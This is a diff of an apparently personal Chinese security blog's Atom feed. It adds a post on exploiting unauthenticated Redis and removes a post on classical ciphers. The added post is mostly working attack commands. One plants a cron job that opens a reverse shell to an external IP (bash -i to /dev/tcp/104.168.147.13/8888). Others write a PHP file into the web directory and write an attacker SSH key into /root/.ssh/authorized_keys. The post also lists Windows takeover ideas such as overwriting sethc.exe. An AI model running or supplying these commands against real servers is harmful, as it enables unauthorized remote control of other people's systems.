@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.yyxyy.xyz/</id>
     <title>Yyx</title>
-    <updated>2021-06-09T08:11:02.166Z</updated>
+    <updated>2021-08-23T14:06:44.792Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.yyxyy.xyz/"/>
     <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
@@ -10,6 +10,49 @@
     <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
     <icon>https://www.yyxyy.xyz/favicon.ico</icon>
     <rights>All rights reserved 2021, Yyx</rights>
+    <entry>
+        <title type="html"><![CDATA[Redis未授权利用及思考]]></title>
+        <id>https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/</id>
+        <link href="https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/">
+        </link>
+        <updated>2021-08-23T14:02:37.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="redis几种基本拿shell的方法">redis几种基本拿shell的方法</h1>
+<h2 id="0x01-计划任务执行命令反弹shell">0x01 计划任务执行命令反弹shell</h2>
+<pre><code class="language-shell">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/104.168.147.13/8888 0&gt;&amp;1\n\n&quot;
+config set dir /var/spool/cron
+config set dbfilename root
+save
+</code></pre>
+<h2 id="0x02-写web目录">0x02 写web目录</h2>
+<pre><code class="language-shell">config set dir /tmp/   这里应该是web目录
+config set dbfilename test.php
+set 1 &quot;&lt;?= phpinfo(); ?&gt;&quot;
+save
+</code></pre>
+<h2 id="0x03-写ssh-key">0x03 写SSH key</h2>
+<pre><code class="language-shell">ssh-key -t rsa#然后按照next执行就行了
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt
+cat test.txt |redis-cli -h 192.168.0.109 -a 123456 -x set crackit
+redis执行
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+save
+</code></pre>
+<h2 id="0x04-主从复制">0x04 主从复制</h2>
+<p>https://github.com/vulhub/redis-rogue-getshell</p>
+<p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
+<h1 id="redis-在win下面的利用及思考">redis 在win下面的利用及思考</h1>
+<h2 id="网上常见的方法">网上常见的方法</h2>
+<p>1.web目录写马</p>
+<p>2.写启动项</p>
+<p>https://www.bilibili.com/read/cv7358287/</p>
+<p>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</p>
+<h2 id="一些其它的方法">一些其它的方法</h2>
+<p>1.dll劫持</p>
+<p>2.覆写一些文件，让用户点击。</p>
+<p>3.覆写sethc.exe。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Flask ssti 漏洞复现]]></title>
         <id>https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/</id>
@@ -969,98 +1012,6 @@ if __name__ == &quot;__main__&quot;:
     print('DES加密结果:',secret)
     print('DES加密结果:',hex(int(secret,2)))
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[传统密码]]></title>
-        <id>https://www.yyxyy.xyz/post/chuan-tong-mi-ma/</id>
-        <link href="https://www.yyxyy.xyz/post/chuan-tong-mi-ma/">
-        </link>
-        <updated>2021-06-06T03:52:37.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="代表代替密码">代表代替密码</h4>
-<h6 id="凯撒密码">凯撒密码</h6>
-<p>加密 C=(p+3)mod26</p>
-<h6 id="playfair密码">Playfair密码</h6>
-<p>Playfair算法基于一个5*5的字母矩阵，该<strong>矩阵使用一个关键词构造</strong>，方法是按从左到右、从上到下顺序，填入关键词的字母(去除重复字母)后，将字母表其作余字母填入。</p>
-<p>关键词取:monarchy（密钥） 得到一个playfair矩阵</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center"></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">M</td>
-<td>O</td>
-<td>N</td>
-<td>A</td>
-<td>R</td>
-</tr>
-<tr>
-<td style="text-align:center">C</td>
-<td>H</td>
-<td>Y</td>
-<td>B</td>
-<td>D</td>
-</tr>
-<tr>
-<td style="text-align:center">E</td>
-<td>F</td>
-<td>G</td>
-<td>I/J</td>
-<td>K</td>
-</tr>
-<tr>
-<td style="text-align:center">L</td>
-<td>P</td>
-<td>Q</td>
-<td>S</td>
-<td>T</td>
-</tr>
-<tr>
-<td style="text-align:center">U</td>
-<td>V</td>
-<td>W</td>
-<td>X</td>
-<td>Z</td>
-</tr>
-</tbody>
-</table>
-<p>加解密规则参考<a href="https://www.cnblogs.com/0zcl/p/6105825.html">https://www.cnblogs.com/0zcl/p/6105825.html</a></p>
-<h6 id="hill-密码">Hill 密码</h6>
-<p>定义M的逆矩阵M^(-1) 有M*M^(-1)=I,I为单位矩阵.</p>
-<p>C=E(K,P)=PKmod26</p>
-<p>P=D(K,C)=CK<sup>(-1)mod26=CKK</sup>(-1)=C</p>
-<h6 id="字母频率统计攻击">字母频率统计攻击</h6>
-<ol>
-<li>对单表代换密码的破译步骤：</li>
-<li>统计密文字母出现频率</li>
-<li>将统计结果与自然语言频率表对比，确定部分密钥</li>
-<li>结合连接特征和重复特征，确定部分密钥</li>
-<li>语义上，猜测其它密钥<br>
-双、三字母的频率统计表往往很有帮助</li>
-</ol>
-<h4 id="多表替换">多表替换</h4>
-<h6 id="维吉尼亚密码">维吉尼亚密码</h6>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/weijiniya.jpg" alt="[d804122d43323968001c920a.jfif]" loading="lazy"></figure>
-<h6 id="一次一密">一次一密</h6>
-<ul>
-<li>使用与消息一样长且无重复的随机密钥来加密消息。密钥只对一个消息加解密，之后丢弃不用。</li>
-<li>不可攻破</li>
-</ul>
-<p>难点</p>
-<ul>
-<li>产生大规模随机密钥有实际困难</li>
-<li>密钥的保护和分配</li>
-</ul>
-<h4 id="置换密码">置换密码</h4>
-<h6 id="栅栏技术">栅栏技术</h6>
-<h6 id="轮转机">轮转机</h6>
 ]]></content>
     </entry>
 </feed>
